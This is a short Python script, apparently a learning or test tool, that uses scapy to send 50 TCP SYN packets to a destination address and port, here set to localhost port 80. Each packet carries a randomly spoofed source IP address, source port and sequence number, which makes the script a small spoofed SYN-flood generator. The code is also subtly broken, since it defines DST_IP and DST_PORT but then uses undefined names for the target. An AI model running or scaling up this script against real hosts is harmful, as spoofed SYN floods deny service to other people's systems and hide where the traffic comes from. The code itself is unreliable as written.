"""
    Sends NUM_SYN_PACKETS amount of Syn TCP packets to a specified destination ip and port.
    
    Uses random src port and ip
"""

from scapy.all import *
from ipaddress import *
import random

NUM_SYN_PACKETS = 50
DST_IP = "127.0.0.1"
DST_PORT = 80
spacket = IP(dst=target_ip) / TCP(dport=target_port, flags="S")

# Craft the SYN packet: IP Header / TCP Header (flags="S" for SYN)
for i in range(NUM_SYN_PACKETS):
    spacket[IP].src = str(IPv4Address(random.getrandbits(32)))
    spacket[TCP].sport = random.getrandbits(16)
    spacket[TCP].seq = random.getrandbits(32)
    send(spacket, verbose=0)

